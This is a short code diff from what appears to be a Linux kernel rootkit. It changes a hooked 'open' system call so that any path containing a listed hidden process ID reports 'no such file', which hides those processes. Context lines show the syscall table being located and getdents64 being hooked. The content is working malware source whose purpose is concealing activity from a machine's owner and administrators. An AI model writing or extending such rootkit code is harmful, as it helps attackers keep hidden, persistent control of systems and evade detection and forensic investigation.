@@ -78,6 +78,7 @@ psize **find_sys_call_table(void) { // Finds the system call table (duh)
 
 asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hacked version of the open syscall
         char *kernel_pathname;
+	int i = 0;
 
         kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);
 
@@ -87,10 +88,14 @@ asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hac
                 kfree(kernel_pathname);
                 return -ENOENT; // Say there is no spoo- I mean file
         }
-        else{
-                kfree(kernel_pathname);
-                return orig_open(pathname, flags, mode); // Shit good, run origonal syscall
-        }
+        for(i = 0; i < index; i++){
+		if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
+			kfree(kernel_pathname);
+                	return -ENOENT; // Say there is no spoo- I mean file
+		}        
+	}
+        kfree(kernel_pathname);
+        return orig_open(pathname, flags, mode); // Shit good, run origonal syscall
 }
 
 /* Hacked Getdents64 Syscall */
